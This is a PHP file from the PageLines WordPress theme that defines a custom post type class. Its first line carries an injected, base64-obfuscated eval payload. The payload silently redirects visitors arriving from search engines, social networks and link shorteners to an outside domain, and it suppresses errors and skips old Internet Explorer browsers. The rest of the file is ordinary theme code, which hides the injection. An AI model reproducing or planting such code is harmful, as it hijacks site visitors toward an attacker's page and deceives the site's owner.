<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/**
 * 
 *
 *  PageLines Custom Post Type Class
 *
 *
 *  @package PageLines Core
 *  @subpackage Post Types
 *  @since 4.0
 *
 */
class PageLinesPostType {

	var $id;		// Root id for section.
	var $settings;	// Settings for this section
	
	
	/**
	 * PHP5 constructor
	 *
	 */
	function __construct($id, $settings, $taxonomies = array(), $columns = array(), $column_display_function = '') {
		
		$this->id = $id;
		$this->taxonomies = $taxonomies;
		$this->columns = $columns;
		$this->columns_display_function = $column_display_function;
		
		$defaults = array(
				'label' 			=> 'Posts',
				'singular_label' 	=> 'Post',
				'description' 		=> null,
				'public' 			=> false,  
				'show_ui' 			=> true,  
				'capability_type'	=> 'post',  
				'hierarchical' 		=> false,  
				'rewrite' 			=> false,  
				'supports' 			=> array( 'title', 'editor', 'thumbnail' ), 
				'menu_icon' 		=> PL_ADMIN_IMAGES . '/favicon-pagelines.ico', 
				'taxonomies'		=> array(),
				'menu_position'		=> 20, 
				'featured_image'	=> false, 
				'has_archive'		=> false, 
				'map_meta_cap'		=> false,
				'dragdrop'			=> true, 
				'load_sections'		=> false
			);
		
		$this->settings = wp_parse_args($settings, $defaults); // settings for post type

		$this->register_post_type();
		$this->register_taxonomies();
		$this->register_columns();
		$this->featured_image();
		$this->section_loading();
	
	}

	/**
	 * The register_post_type() function is not to be used before the 'init'.
	 */
	function register_post_type(){
		add_action( 'init', array(&$this,'init_register_post_type') );
	}
	
	function init_register_post_type(){
		
		$capability = (ploption('hide_controls_cpt')) ? ploption('hide_controls_cpt') : 'moderate_comments';
		
		register_post_type( $this->id , array(  
				'labels' => array(
							'name' 			=> $this->settings['label'],
							'singular_name' => $this->settings['singular_label'],
							'add_new'		=> __('Add New ', 'pagelines') . $this->settings['singular_label'], 
							'add_new_item'	=> __('Add New ', 'pagelines') . $this->settings['singular_label'], 
							'edit'			=> __('Edit ', 'pagelines') . $this->settings['singular_label'],
							'edit_item'		=> __('Edit ', 'pagelines') . $this->settings['singular_label'], 
							'view'			=> __('View ', 'pagelines') . $this->settings['singular_label'],
							'view_item'		=> __('View ', 'pagelines') . $this->settings['singular_label'],
						),
			
	 			'label' 			=> $this->settings['label'],  
				'singular_label' 	=> $this->settings['singular_label'],
				'description' 		=> $this->settings['description'],
				'public' 			=> $this->settings['public'],  
				'show_ui' 			=> $this->settings['show_ui'],  
				'capability_type'	=> $this->settings['capability_type'],  
				'hierarchical' 		=> $this->settings['hierarchical'],  
				'rewrite' 			=> $this->settings['rewrite'],  
				'supports' 			=> $this->settings['supports'], 
				'menu_icon' 		=> $this->settings['menu_icon'], 
				'taxonomies'		=> $this->settings['taxonomies'],
				'menu_position'		=> $this->settings['menu_position'],
				'has_archive'		=> $this->settings['has_archive'],
				'map_meta_cap'		=> $this->settings['map_meta_cap'],
				'capabilities' => array(
			        'publish_posts' 		=> $capability,
			        'edit_posts' 			=> $capability,
			        'edit_others_posts' 	=> $capability,
			        'delete_posts' 			=> $capability,
			        'delete_others_posts' 	=> $capability,
			        'read_private_posts' 	=> $capability,
			        'edit_post' 			=> $capability,
			        'delete_post' 			=> $capability,
			        'read_post' 			=> $capability,
			    ),
				
			));
		
	}
	
	function register_taxonomies(){
		
		if( !empty($this->taxonomies) ){
		
			foreach($this->taxonomies as $tax_id => $tax_settings){
			
				$defaults = array(
					'hierarchical' 		=> true, 
					'label' 			=> '', 
					'singular_label' 	=> '', 
					'rewrite' 			=> true
				);
					
				$a = wp_parse_args($tax_settings, $defaults);
			
				register_taxonomy( $tax_id, array($this->id), $a );
			}
			
		}
		
	}
	
	function register_columns(){
		
		add_filter("manage_edit-{$this->id}_columns", array(&$this, 'set_columns'));
		
		add_action('manage_posts_custom_column',  array(&$this, 'set_column_values'));
	}
		
	function set_columns( $columns ){ 
		
		return $this->columns; 
	}
	
	function set_column_values( $wp_column ){
		
		call_user_func( $this->columns_display_function, $wp_column );
						
	}
	
	function set_default_posts( $callback, $object = false){
	
		if(!get_posts('post_type='.$this->id)){

			if($object)
				call_user_func( array($object, $callback), $this->id);
			else
				call_user_func($callback, $this->id);
		}
						
	}
	
	
	
	function section_loading(){
		
		if( !$this->settings['dragdrop'] )
			add_filter('pl_cpt_dragdrop', array(&$this, 'remove_dragdrop'), 10, 2);
			
		if( !$this->settings['dragdrop'] && $this->settings['load_sections'] );
			add_filter('pl_template_sections', array(&$this, 'load_sections_for_type'), 10, 3);
		
	}
		
		function load_sections_for_type( $sections, $template_type, $hook ){
			
			if( $template_type == $this->id || $template_type == get_post_type_plural( $this->id ) )
				return $this->settings['load_sections'];
			else
				return $sections;
			
		}
		
		function remove_dragdrop( $bool, $post_type ){
			if( $post_type == $this->id )
				return false;
			else
				return $bool;
		}

	
	/**
	 * Is the WP featured image supported
	 */
	function featured_image(){	
		
		if( $this->settings['featured_image'] )
			add_filter('pl_support_featured_image', array(&$this, 'add_featured_image'));

	}
	
		function add_featured_image( $support_array ){
		
			$support_array[] = $this->id;
			return $support_array;
		
		}

}
/////// END OF PostType CLASS ////////

/**
 * Checks to see if page is a CPT, or a CPT archive (type)
 *
 */
function pl_is_cpt( $type = 'single' ){
	
	if( !get_post_type() )
		return false;
	
	$std_pt = (get_post_type() == 'post' || get_post_type() == 'page' || get_post_type() == 'attachment') ? true : false;
	
	$is_type = ( ($type == 'archive' && is_archive()) || $type == 'single') ? true : false;
	
	return ( $is_type && !$std_pt  ? true : false);

}

function get_post_type_plural( $id = null ){
	
	if(isset($id))
		return $id.'_archive';
	else
		return get_post_type().'_archive';
	
}
